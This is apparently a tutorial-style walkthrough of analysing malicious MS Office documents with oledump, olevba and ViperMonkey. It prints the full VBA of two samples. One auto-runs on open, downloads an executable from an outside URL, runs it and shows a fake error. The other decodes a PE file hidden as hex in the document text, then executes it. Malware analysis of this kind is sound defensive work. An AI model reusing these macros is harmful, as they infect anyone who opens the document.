# MS Office malware analysis


## Identification & analysis of MS Office file

### oledump.py

* Download : https://github.com/DidierStevens/DidierStevensSuite

```
eloi@Null2Root:~/Desktop/Tools/Malware/DidierStevensSuite$ python oledump.py ../_sample/office/5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.bin 
  1:       125 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:     28579 '1Table'
  5:    457587 'Data'
  6:       367 'Macros/PROJECT'
  7:        41 'Macros/PROJECTwm'
  8: M    5221 'Macros/VBA/ThisDocument'
  9:      2775 'Macros/VBA/_VBA_PROJECT'
 10:      2196 'Macros/VBA/__SRP_0'
 11:       200 'Macros/VBA/__SRP_1'
 12:      1280 'Macros/VBA/__SRP_2'
 13:       356 'Macros/VBA/__SRP_3'
 14:       514 'Macros/VBA/dir'
 15:     14920 'WordDocument'
 ```
 
 ```
eloi@Null2Root:~/Desktop/Tools/Malware/DidierStevensSuite$ python oledump.py ../_sample/office/5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.bin -s 8 -v
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Option Explicit
Private Declare Function URLDownloadToFileA Lib "urlmon" (ByVal FVQGKS As Long, _
ByVal WSGSGY As String, ByVal IFRRFV As String, ByVal NCVOLV As Long, _
ByVal HQTLDG As Long) As Long
Sub AutoOpen()
    Auto_Open
End Sub
Sub Auto_Open()
SNVJYQ
End Sub
Public Sub SNVJYQ()
    OGEXYR "http://germanya.com.ec/logs/test.exe", Environ("TMP") & "\sfjozjero.exe"
End Sub
Function OGEXYR(XSTAHU As String, PHHWIV As String) As Boolean
    Dim HRKUYU, lala As Long
    HRKUYU = URLDownloadToFileA(0, XSTAHU, PHHWIV, 0, 0)
    If HRKUYU = 0 Then OGEXYR = True
    Dim YKPZZS
    YKPZZS = Shell(PHHWIV, 1)
    MsgBox "El contenido de este documento no es compatible con este equipo." & vbCrLf & vbCrLf & "Por favor intente desde otro equipo.", vbCritical, "Equipo no compatible"
    lala = URLDownloadToFileA(0, "http://germanya.com.ec/logs/counter.php", Environ("TMP") & "\lkjljlljk", 0, 0)
    Application.DisplayAlerts = False
    Application.Quit
End Function
Sub Workbook_Open()
    Auto_Open
End Sub
```


## VBA macro analysis

### olevba

* Download : https://github.com/decalage2/oletools

```
eloi@Null2Root:~/Desktop/Tools/Malware$ olevba --analysis --decode 5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.vba 
olevba 0.53.1 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
TXT:MASI---- 5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.vba
===============================================================================
FILE: 5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.vba
Type: Text
-------------------------------------------------------------------------------
VBA MACRO 5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.vba 
in file: 5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.vba - OLE stream: ''
+------------+----------------------+-----------------------------------------+
| Type       | Keyword              | Description                             |
+------------+----------------------+-----------------------------------------+
| AutoExec   | AutoOpen             | Runs when the Word document is opened   |
| AutoExec   | Auto_Open            | Runs when the Excel Workbook is opened  |
| AutoExec   | Workbook_Open        | Runs when the Excel Workbook is opened  |
| Suspicious | Shell                | May run an executable file or a system  |
|            |                      | command                                 |
| Suspicious | Environ              | May read system environment variables   |
| Suspicious | URLDownloadToFileA   | May download files from the Internet    |
| Suspicious | Lib                  | May run code from a DLL                 |
| IOC        | http://germanya.com. | URL                                     |
|            | ec/logs/test.exe     |                                         |
| IOC        | http://germanya.com. | URL                                     |
|            | ec/logs/counter.php  |                                         |
| IOC        | test.exe             | Executable file name                    |
| IOC        | sfjozjero.exe        | Executable file name                    |
+------------+----------------------+-----------------------------------------+

```

### vipermonkey

* Download : https://github.com/decalage2/ViperMonkey

```
eloi@Null2Root:~/Desktop/Tools/Malware/ViperMonkey-master/vipermonkey$ python vmonkey.py ../../_sample/office/5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.bin 
vmonkey 0.06 - https://github.com/decalage2/ViperMonkey
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/ViperMonkey/issues

===============================================================================
FILE: ../../_sample/office/5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.bin
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ../../_sample/office/5762576fc6a09b4ddd95908c6c34ab9b38e06a6b2878099433347cabfbeccc18.bin - OLE stream: u'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-------------------------------------------------------------------------------
VBA CODE (with long lines collapsed):
Option Explicit
Private Declare Function URLDownloadToFileA Lib "urlmon" (ByVal FVQGKS As Long, ByVal WSGSGY As String, ByVal IFRRFV As String, ByVal NCVOLV As Long, ByVal HQTLDG As Long) As Long
Sub AutoOpen()
    Auto_Open
End Sub
Sub Auto_Open()
SNVJYQ
End Sub
Public Sub SNVJYQ()
    OGEXYR "http://germanya.com.ec/logs/test.exe", Environ("TMP") & "\sfjozjero.exe"
End Sub
Function OGEXYR(XSTAHU As String, PHHWIV As String) As Boolean
    Dim HRKUYU, lala As Long
    HRKUYU = URLDownloadToFileA(0, XSTAHU, PHHWIV, 0, 0)
    If HRKUYU = 0 Then OGEXYR = True
    Dim YKPZZS
    YKPZZS = Shell(PHHWIV, 1)
    MsgBox "El contenido de este documento no es compatible con este equipo." & vbCrLf & vbCrLf & "Por favor intente desde otro equipo.", vbCritical, "Equipo no compatible"
    lala = URLDownloadToFileA(0, "http://germanya.com.ec/logs/counter.php", Environ("TMP") & "\lkjljlljk", 0, 0)
    Application.DisplayAlerts = False
    Application.Quit
End Function
Sub Workbook_Open()
    Auto_Open
End Sub

-------------------------------------------------------------------------------
PARSING VBA CODE:
INFO     parsed Sub AutoOpen (): 1 statement(s)
INFO     parsed Sub Auto_Open (): 1 statement(s)
INFO     parsed Sub SNVJYQ (): 1 statement(s)
INFO     parsed Function OGEXYR ([XSTAHU as String, PHHWIV as String]): 9 statement(s)
INFO     parsed Sub Workbook_Open (): 1 statement(s)
Module None
  Sub AutoOpen (): 1 statement(s)
  Sub SNVJYQ (): 1 statement(s)
  Sub Workbook_Open (): 1 statement(s)
  Sub Auto_Open (): 1 statement(s)
  Function OGEXYR ([XSTAHU as String, PHHWIV as String]): 9 statement(s)
  External Function URLDownloadToFileA ([FVQGKS as Long, WSGSGY as String, IFRRFV as String, NCVOLV as Long, HQTLDG as Long]) from urlmon.dll alias 

-------------------------------------------------------------------------------
TRACING VBA CODE (entrypoint = Auto*):
INFO     ACTION: Found Entry Point - params 'autoopen' - 
INFO     calling Function: Environ('TMP')
INFO     ACTION: Environ - params "'TMP'" - Interesting Function Call
INFO     Calling Procedure: OGEXYR("['http://germanya.com.ec/logs/test.exe', '%TMP%\\\\sfjozjero.exe']")
INFO     calling Function: URLDownloadToFileA(0, 'http://germanya.com.ec/logs/test.exe', '%TMP%\\sfjozjero.exe', 0, 0)
INFO     ACTION: Download URL - params 'http://germanya.com.ec/logs/test.exe' - External Function: urlmon.dll / URLDownloadToFile
INFO     ACTION: Write File - params '%TMP%\\sfjozjero.exe' - External Function: urlmon.dll / URLDownloadToFile
INFO     calling Function: Shell('%TMP%\\sfjozjero.exe', 1)
INFO     Shell('%TMP%\\sfjozjero.exe')
INFO     ACTION: Execute Command - params '%TMP%\\sfjozjero.exe' - Shell function
INFO     Calling Procedure: MsgBox("['El contenido de este documento no es compatible con este equipo.\\r\\n\\r\\nPor fa...")
INFO     ACTION: Display Message - params "'El contenido de este documento no es compatible con este equipo.\\r\\n\\r\\nPor favor intente desde otro equipo.'" - MsgBox
INFO     calling Function: Environ('TMP')
INFO     ACTION: Environ - params "'TMP'" - Interesting Function Call
INFO     calling Function: URLDownloadToFileA(0, 'http://germanya.com.ec/logs/counter.php', '%TMP%\\lkjljlljk', 0, 0)
INFO     ACTION: Download URL - params 'http://germanya.com.ec/logs/counter.php' - External Function: urlmon.dll / URLDownloadToFile
INFO     ACTION: Write File - params '%TMP%\\lkjljlljk' - External Function: urlmon.dll / URLDownloadToFile
INFO     ACTION: Found Entry Point - params 'auto_open' - 
INFO     calling Function: Environ('TMP')
INFO     ACTION: Environ - params "'TMP'" - Interesting Function Call
INFO     Calling Procedure: OGEXYR("['http://germanya.com.ec/logs/test.exe', '%TMP%\\\\sfjozjero.exe']")
INFO     calling Function: URLDownloadToFileA(0, 'http://germanya.com.ec/logs/test.exe', '%TMP%\\sfjozjero.exe', 0, 0)
INFO     ACTION: Download URL - params 'http://germanya.com.ec/logs/test.exe' - External Function: urlmon.dll / URLDownloadToFile
INFO     ACTION: Write File - params '%TMP%\\sfjozjero.exe' - External Function: urlmon.dll / URLDownloadToFile
INFO     calling Function: Shell('%TMP%\\sfjozjero.exe', 1)
INFO     Shell('%TMP%\\sfjozjero.exe')
INFO     ACTION: Execute Command - params '%TMP%\\sfjozjero.exe' - Shell function
INFO     Calling Procedure: MsgBox("['El contenido de este documento no es compatible con este equipo.\\r\\n\\r\\nPor fa...")
INFO     ACTION: Display Message - params "'El contenido de este documento no es compatible con este equipo.\\r\\n\\r\\nPor favor intente desde otro equipo.'" - MsgBox
INFO     calling Function: Environ('TMP')
INFO     ACTION: Environ - params "'TMP'" - Interesting Function Call
INFO     calling Function: URLDownloadToFileA(0, 'http://germanya.com.ec/logs/counter.php', '%TMP%\\lkjljlljk', 0, 0)
INFO     ACTION: Download URL - params 'http://germanya.com.ec/logs/counter.php' - External Function: urlmon.dll / URLDownloadToFile
INFO     ACTION: Write File - params '%TMP%\\lkjljlljk' - External Function: urlmon.dll / URLDownloadToFile
INFO     ACTION: Found Entry Point - params 'workbook_open' - 
INFO     calling Function: Environ('TMP')
INFO     ACTION: Environ - params "'TMP'" - Interesting Function Call
INFO     Calling Procedure: OGEXYR("['http://germanya.com.ec/logs/test.exe', '%TMP%\\\\sfjozjero.exe']")
INFO     calling Function: URLDownloadToFileA(0, 'http://germanya.com.ec/logs/test.exe', '%TMP%\\sfjozjero.exe', 0, 0)
INFO     ACTION: Download URL - params 'http://germanya.com.ec/logs/test.exe' - External Function: urlmon.dll / URLDownloadToFile
INFO     ACTION: Write File - params '%TMP%\\sfjozjero.exe' - External Function: urlmon.dll / URLDownloadToFile
INFO     calling Function: Shell('%TMP%\\sfjozjero.exe', 1)
INFO     Shell('%TMP%\\sfjozjero.exe')
INFO     ACTION: Execute Command - params '%TMP%\\sfjozjero.exe' - Shell function
INFO     Calling Procedure: MsgBox("['El contenido de este documento no es compatible con este equipo.\\r\\n\\r\\nPor fa...")
INFO     ACTION: Display Message - params "'El contenido de este documento no es compatible con este equipo.\\r\\n\\r\\nPor favor intente desde otro equipo.'" - MsgBox
INFO     calling Function: Environ('TMP')
INFO     ACTION: Environ - params "'TMP'" - Interesting Function Call
INFO     calling Function: URLDownloadToFileA(0, 'http://germanya.com.ec/logs/counter.php', '%TMP%\\lkjljlljk', 0, 0)
INFO     ACTION: Download URL - params 'http://germanya.com.ec/logs/counter.php' - External Function: urlmon.dll / URLDownloadToFile
INFO     ACTION: Write File - params '%TMP%\\lkjljlljk' - External Function: urlmon.dll / URLDownloadToFile
Recorded Actions:
+-------------------+---------------------------+---------------------------+
| Action            | Parameters                | Description               |
+-------------------+---------------------------+---------------------------+
| Found Entry Point | autoopen                  |                           |
| Environ           | 'TMP'                     | Interesting Function Call |
| Download URL      | http://germanya.com.ec/lo | External Function:        |
|                   | gs/test.exe               | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Write File        | %TMP%\sfjozjero.exe       | External Function:        |
|                   |                           | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Execute Command   | %TMP%\sfjozjero.exe       | Shell function            |
| Display Message   | 'El contenido de este     | MsgBox                    |
|                   | documento no es           |                           |
|                   | compatible con este       |                           |
|                   | equipo.\r\n\r\nPor favor  |                           |
|                   | intente desde otro        |                           |
|                   | equipo.'                  |                           |
| Environ           | 'TMP'                     | Interesting Function Call |
| Download URL      | http://germanya.com.ec/lo | External Function:        |
|                   | gs/counter.php            | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Write File        | %TMP%\lkjljlljk           | External Function:        |
|                   |                           | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Found Entry Point | auto_open                 |                           |
| Environ           | 'TMP'                     | Interesting Function Call |
| Download URL      | http://germanya.com.ec/lo | External Function:        |
|                   | gs/test.exe               | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Write File        | %TMP%\sfjozjero.exe       | External Function:        |
|                   |                           | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Execute Command   | %TMP%\sfjozjero.exe       | Shell function            |
| Display Message   | 'El contenido de este     | MsgBox                    |
|                   | documento no es           |                           |
|                   | compatible con este       |                           |
|                   | equipo.\r\n\r\nPor favor  |                           |
|                   | intente desde otro        |                           |
|                   | equipo.'                  |                           |
| Environ           | 'TMP'                     | Interesting Function Call |
| Download URL      | http://germanya.com.ec/lo | External Function:        |
|                   | gs/counter.php            | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Write File        | %TMP%\lkjljlljk           | External Function:        |
|                   |                           | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Found Entry Point | workbook_open             |                           |
| Environ           | 'TMP'                     | Interesting Function Call |
| Download URL      | http://germanya.com.ec/lo | External Function:        |
|                   | gs/test.exe               | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Write File        | %TMP%\sfjozjero.exe       | External Function:        |
|                   |                           | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Execute Command   | %TMP%\sfjozjero.exe       | Shell function            |
| Display Message   | 'El contenido de este     | MsgBox                    |
|                   | documento no es           |                           |
|                   | compatible con este       |                           |
|                   | equipo.\r\n\r\nPor favor  |                           |
|                   | intente desde otro        |                           |
|                   | equipo.'                  |                           |
| Environ           | 'TMP'                     | Interesting Function Call |
| Download URL      | http://germanya.com.ec/lo | External Function:        |
|                   | gs/counter.php            | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
| Write File        | %TMP%\lkjljlljk           | External Function:        |
|                   |                           | urlmon.dll /              |
|                   |                           | URLDownloadToFile         |
+-------------------+---------------------------+---------------------------+
```

## PE file extraction from MS Office malware

```
eloi@Null2Root:~/Desktop/Tools/Malware/DidierStevensSuite$ python oledump.py ../_sample/office/d3672a6b3bc839d76b1d4c2e98ab8c3ef84cb9e928fc3cadad3f4144aa5f8e29.bin 
  1:       113 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      5890 '1Table'
  5:       369 'Macros/PROJECT'
  6:        41 'Macros/PROJECTwm'
  7: M    5159 'Macros/VBA/ThisDocument'
  8:      2938 'Macros/VBA/_VBA_PROJECT'
  9:      1496 'Macros/VBA/__SRP_0'
 10:       102 'Macros/VBA/__SRP_1'
 11:       972 'Macros/VBA/__SRP_2'
 12:       214 'Macros/VBA/__SRP_3'
 13:       513 'Macros/VBA/dir'
 14:    260142 'WordDocument'
```

```
eloi@Null2Root:~/Desktop/Tools/Malware/_sample/office$ olevba d3672a6b3bc839d76b1d4c2e98ab8c3ef84cb9e928fc3cadad3f4144aa5f8e29.bin 
olevba 0.53.1 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
OLE:MASI---- d3672a6b3bc839d76b1d4c2e98ab8c3ef84cb9e928fc3cadad3f4144aa5f8e29.bin
===============================================================================
FILE: d3672a6b3bc839d76b1d4c2e98ab8c3ef84cb9e928fc3cadad3f4144aa5f8e29.bin
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: d3672a6b3bc839d76b1d4c2e98ab8c3ef84cb9e928fc3cadad3f4144aa5f8e29.bin - OLE stream: u'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()
   v45
End Sub
Sub AutoOpen()
   Auto_Open
End Sub
Sub Workbook_Open()
   Auto_Open
End Sub

Sub v45()

Dim TmpFile
Dim TmpName
Dim lInputFile
Dim Data
Dim BytesWritten


TmpFile = Environ("TEMP")
TmpName = TmpFile & "docm.exe"

Data = ActiveDocument.Range.Text
Dim Text
Dim Pos
Dim Symbol
Pos = InStr(10, Data, "1234")
BytesWritten = Pos + 4

lInputFile = FreeFile
Open TmpName For Binary Lock Write As #lInputFile

While (BytesWritten < Len(Data))
Symbol = Mid(Data, BytesWritten, 4)
Put #lInputFile, , CByte(Symbol)
BytesWritten = BytesWritten + 4
Wend

Close #lInputFile

Shell TmpName, vbNormalFocus


End Sub
+------------+---------------+-----------------------------------------+
| Type       | Keyword       | Description                             |
+------------+---------------+-----------------------------------------+
| AutoExec   | AutoOpen      | Runs when the Word document is opened   |
| AutoExec   | Auto_Open     | Runs when the Excel Workbook is opened  |
| AutoExec   | Workbook_Open | Runs when the Excel Workbook is opened  |
| Suspicious | Open          | May open a file                         |
| Suspicious | Shell         | May run an executable file or a system  |
|            |               | command                                 |
| Suspicious | vbNormalFocus | May run an executable file or a system  |
|            |               | command                                 |
| Suspicious | Binary        | May read or write a binary file (if     |
|            |               | combined with Open)                     |
| Suspicious | Environ       | May read system environment variables   |
| Suspicious | Write         | May write to a file (if combined with   |
|            |               | Open)                                   |
| Suspicious | Put           | May write to a file (if combined with   |
|            |               | Open)                                   |
| IOC        | docm.exe      | Executable file name                    |
+------------+---------------+-----------------------------------------+
```

```
eloi@Null2Root:~/Desktop/Tools/Malware/DidierStevensSuite$ python oledump.py ../_sample/office/d3672a6b3bc839d76b1d4c2e98ab8c3ef84cb9e928fc3cadad3f4144aa5f8e29.bin
  1:       113 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      5890 '1Table'
  5:       369 'Macros/PROJECT'
  6:        41 'Macros/PROJECTwm'
  7: M    5159 'Macros/VBA/ThisDocument'
  8:      2938 'Macros/VBA/_VBA_PROJECT'
  9:      1496 'Macros/VBA/__SRP_0'
 10:       102 'Macros/VBA/__SRP_1'
 11:       972 'Macros/VBA/__SRP_2'
 12:       214 'Macros/VBA/__SRP_3'
 13:       513 'Macros/VBA/dir'
 14:    260142 'WordDocument'
```

```
eloi@Null2Root:~/Desktop/Tools/Malware/DidierStevensSuite$ python oledump.py ../_sample/office/d3672a6b3bc839d76b1d4c2e98ab8c3ef84cb9e928fc3cadad3f4144aa5f8e29.bin -s 14 | more
00000000: EC A5 C1 00 71 60 09 04  00 00 F0 12 BF 00 00 00  ....q`..........
00000010: 00 00 00 10 00 00 00 00  00 06 00 00 37 F0 03 00  ............7...
00000020: 0E 00 62 6A 62 6A 71 50  71 50 00 00 00 00 00 00  ..bjbjqPqP......
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 19 04 16 00  ................
00000040: 2E F8 03 00 13 3A 01 00  13 3A 01 00 37 E8 03 00  .....:...:..7...
00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000060: 00 00 00 00 00 00 00 00  00 00 00 00 FF FF 0F 00  ................
00000070: 00 00 00 00 00 00 00 00  FF FF 0F 00 00 00 00 00  ................
00000080: 00 00 00 00 FF FF 0F 00  00 00 00 00 00 00 00 00  ................
00000090: 00 00 00 00 00 00 00 00  A4 00 00 00 00 00 3C 04  ..............<.
000000A0: 00 00 00 00 00 00 3C 04  00 00 3C 04 00 00 00 00  ......<...<.....
000000B0: 00 00 3C 04 00 00 00 00  00 00 3C 04 00 00 00 00  ..<.......<.....
000000C0: 00 00 3C 04 00 00 00 00  00 00 3C 04 00 00 14 00  ..<.......<.....
000000D0: 00 00 00 00 00 00 00 00  00 00 36 0E 00 00 64 00  ..........6...d.
000000E0: 00 00 02 10 00 00 00 00  00 00 02 10 00 00 00 00  ................
000000F0: 00 00 02 10 00 00 00 00  00 00 02 10 00 00 0C 00  ................
00000100: 00 00 0E 10 00 00 0C 00  00 00 9A 0E 00 00 00 00  ................
00000110: 00 00 AA 13 00 00 B6 00  00 00 26 10 00 00 00 00  ..........&.....
00000120: 00 00 26 10 00 00 00 00  00 00 26 10 00 00 00 00  ..&.......&.....
00000130: 00 00 26 10 00 00 00 00  00 00 26 10 00 00 00 00  ..&.......&.....
00000140: 00 00 26 10 00 00 00 00  00 00 26 10 00 00 00 00  ..&.......&.....
00000150: 00 00 26 10 00 00 00 00  00 00 BE 10 00 00 6D 02  ..&...........m.
00000160: 00 00 2B 13 00 00 00 00  00 00 2B 13 00 00 00 00  ..+.......+.....
00000170: 00 00 2B 13 00 00 00 00  00 00 2B 13 00 00 00 00  ..+.......+.....
00000180: 00 00 2B 13 00 00 00 00  00 00 2B 13 00 00 24 00  ..+.......+...$.
00000190: 00 00 60 14 00 00 68 02  00 00 C8 16 00 00 3A 00  ..`...h.......:.
000001A0: 00 00 4F 13 00 00 15 00  00 00 00 00 00 00 00 00  ..O.............
000001B0: 00 00 00 00 00 00 00 00  00 00 3C 04 00 00 00 00  ..........<.....
000001C0: 00 00 26 10 00 00 00 00  00 00 00 00 00 00 00 00  ..&.............
000001D0: 00 00 00 00 00 00 00 00  00 00 26 10 00 00 00 00  ..........&.....
000001E0: 00 00 26 10 00 00 00 00  00 00 26 10 00 00 00 00  ..&.......&.....
000001F0: 00 00 26 10 00 00 00 00  00 00 4F 13 00 00 00 00  ..&.......O.....
00000200: 00 00 00 00 00 00 00 00  00 00 3C 04 00 00 00 00  ..........<.....
00000210: 00 00 3C 04 00 00 00 00  00 00 26 10 00 00 00 00  ..<.......&.....
00000220: 00 00 00 00 00 00 00 00  00 00 26 10 00 00 00 00  ..........&.....
00000230: 00 00 64 13 00 00 16 00  00 00 5A 10 00 00 00 00  ..d.......Z.....
00000240: 00 00 5A 10 00 00 00 00  00 00 5A 10 00 00 00 00  ..Z.......Z.....
00000250: 00 00 26 10 00 00 16 00  00 00 3C 04 00 00 00 00  ..&.......<.....
00000260: 00 00 26 10 00 00 00 00  00 00 3C 04 00 00 00 00  ..&.......<.....
00000270: 00 00 26 10 00 00 00 00  00 00 BE 10 00 00 00 00  ..&.............
00000280: 00 00 00 00 00 00 00 00  00 00 5A 10 00 00 00 00  ..........Z.....
00000290: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000002A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000002B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000002C0: 00 00 26 10 00 00 00 00  00 00 BE 10 00 00 00 00  ..&.............
000002D0: 00 00 00 00 00 00 00 00  00 00 5A 10 00 00 00 00  ..........Z.....
000002E0: 00 00 00 00 00 00 00 00  00 00 5A 10 00 00 00 00  ..........Z.....
000002F0: 00 00 3C 04 00 00 00 00  00 00 3C 04 00 00 00 00  ..<.......<.....
00000300: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000310: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000320: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000330: 00 00 00 00 00 00 00 00  00 00 5A 10 00 00 00 00  ..........Z.....
00000340: 00 00 26 10 00 00 00 00  00 00 1A 10 00 00 0C 00  ..&.............
00000350: 00 00 40 D2 9F 9A C1 1A  D0 01 00 00 00 00 00 00  ..@.............
00000360: 00 00 02 10 00 00 00 00  00 00 3C 10 00 00 0A 00  ..........<.....
00000370: 00 00 5A 10 00 00 00 00  00 00 00 00 00 00 00 00  ..Z.............
00000380: 00 00 BE 10 00 00 00 00  00 00 7A 13 00 00 30 00  ..........z...0.
00000390: 00 00 AA 13 00 00 00 00  00 00 5A 10 00 00 00 00  ..........Z.....
000003A0: 00 00 02 17 00 00 00 00  00 00 46 10 00 00 0A 00  ..........F.....
000003B0: 00 00 02 17 00 00 00 00  00 00 5A 10 00 00 00 00  ..........Z.....
000003C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
...
00000800: 50 6C 65 61 73 65 20 65  6E 61 62 6C 65 20 6D 61  Please enable ma
00000810: 63 72 6F 73 65 73 20 74  6F 20 76 69 65 77 20 74  croses to view t
00000820: 68 69 73 20 64 6F 63 75  6D 65 6E 74 0D 0D 0D 0D  his document....
00000830: 0D 0D 31 32 33 34 26 48  34 64 26 48 35 61 26 48  ..1234&H4d&H5a&H
00000840: 39 30 26 48 30 30 26 48  30 33 26 48 30 30 26 48  90&H00&H03&H00&H
00000850: 30 30 26 48 30 30 26 48  30 34 26 48 30 30 26 48  00&H00&H04&H00&H
00000860: 30 30 26 48 30 30 26 48  66 66 26 48 66 66 26 48  00&H00&Hff&Hff&H
00000870: 30 30 26 48 30 30 26 48  62 38 26 48 30 30 26 48  00&H00&Hb8&H00&H
00000880: 30 30 26 48 30 30 26 48  30 30 26 48 30 30 26 48  00&H00&H00&H00&H
00000890: 30 30 26 48 30 30 26 48  34 30 26 48 30 30 26 48  00&H00&H40&H00&H
000008A0: 30 30 26 48 30 30 26 48  30 30 26 48 30 30 26 48  00&H00&H00&H00&H
000008B0: 30 30 26 48 30 30 26 48  30 30 26 48 30 30 26 48  00&H00&H00&H00&H
000008C0: 30 30 26 48 30 30 26 48  30 30 26 48 30 30 26 48  00&H00&H00&H00&H
000008D0: 30 30 26 48 30 30 26 48  30 30 26 48 30 30 26 48  00&H00&H00&H00&H
000008E0: 30 30 26 48 30 30 26 48  30 30 26 48 30 30 26 48  00&H00&H00&H00&H
000008F0: 30 30 26 48 30 30 26 48  30 30 26 48 30 30 26 48  00&H00&H00&H00&H
00000900: 30 30 26 48 30 30 26 48  30 30 26 48 30 30 26 48  00&H00&H00&H00&H
00000910: 30 30 26 48 30 30 26 48  30 30 26 48 30 30 26 48  00&H00&H00&H00&H
00000920: 30 30 26 48 30 30 26 48  38 30 26 48 30 30 26 48  00&H00&H80&H00&H
00000930: 30 30 26 48 30 30 26 48  30 65 26 48 31 66 26 48  00&H00&H0e&H1f&H
00000940: 62 61 26 48 30 65 26 48  30 30 26 48 62 34 26 48  ba&H0e&H00&Hb4&H
00000950: 30 39 26 48 63 64 26 48  32 31 26 48 62 38 26 48  09&Hcd&H21&Hb8&H
00000960: 30 31 26 48 34 63 26 48  63 64 26 48 32 31 26 48  01&H4c&Hcd&H21&H
00000970: 35 34 26 48 36 38 26 48  36 39 26 48 37 33 26 48  54&H68&H69&H73&H
00000980: 32 30 26 48 37 30 26 48  37 32 26 48 36 66 26 48  20&H70&H72&H6f&H
00000990: 36 37 26 48 37 32 26 48  36 31 26 48 36 64 26 48  67&H72&H61&H6d&H
000009A0: 32 30 26 48 36 33 26 48  36 31 26 48 36 65 26 48  20&H63&H61&H6e&H
000009B0: 36 65 26 48 36 66 26 48  37 34 26 48 32 30 26 48  6e&H6f&H74&H20&H
000009C0: 36 32 26 48 36 35 26 48  32 30 26 48 37 32 26 48  62&H65&H20&H72&H
000009D0: 37 35 26 48 36 65 26 48  32 30 26 48 36 39 26 48  75&H6e&H20&H69&H
000009E0: 36 65 26 48 32 30 26 48  34 34 26 48 34 66 26 48  6e&H20&H44&H4f&H
000009F0: 35 33 26 48 32 30 26 48  36 64 26 48 36 66 26 48  53&H20&H6d&H6f&H
00000A00: 36 34 26 48 36 35 26 48  32 65 26 48 30 64 26 48  64&H65&H2e&H0d&H
00000A10: 30 64 26 48 30 61 26 48  32 34 26 48 30 30 26 48  0d&H0a&H24&H00&H
00000A20: 30 30 26 48 30 30 26 48  30 30 26 48 30 30 26 48  00&H00&H00&H00&H
00000A30: 30 30 26 48 30 30 26 48  35 30 26 48 34 35 26 48  00&H00&H50&H45&H
00000A40: 30 30 26 48 30 30 26 48  34 63 26 48 30 31 26 48  00&H00&H4c&H01&H
00000A50: 30 33 26 48 30 30 26 48  35 38 26 48 38 64 26 48  03&H00&H58&H8d&H
00000A60: 39 31 26 48 35 34 26 48  30 30 26 48 30 30 26 48  91&H54&H00&H00&H
00000A70: 30 30 26 48 30 30 26 48  30 30 26 48 30 30 26 48  00&H00&H00&H00&H
00000A80: 30 30 26 48 30 30 26 48  65 30 26 48 30 30 26 48  00&H00&He0&H00&H
00000A90: 30 32 26 48 30 31 26 48  30 62 26 48 30 31 26 48  02&H01&H0b&H01&H
00000AA0: 30 38 26 48 30 30 26 48  30 30 26 48 66 30 26 48  08&H00&H00&Hf0&H
00000AB0: 30 30 26 48 30 30 26 48  30 30 26 48 30 38 26 48  00&H00&H00&H08&H
00000AC0: 30 30 26 48 30 30 26 48  30 30 26 48 30 30 26 48  00&H00&H00&H00&H
00000AD0: 30 30 26 48 30 30 26 48  64 65 26 48 30 66 26 48  00&H00&Hde&H0f&H
00000AE0: 30 31 26 48 30 30 26 48  30 30 26 48 32 30 26 48  01&H00&H00&H20&H
00000AF0: 30 30 26 48 30 30 26 48  30 30 26 48 32 30 26 48  00&H00&H00&H20&H
00000B00: 30 31 26 48 30 30 26 48  30 30 26 48 30 30 26 48  01&H00&H00&H00&H
00000B10: 34 30 26 48 30 30 26 48  30 30 26 48 32 30 26 48  40&H00&H00&H20&H
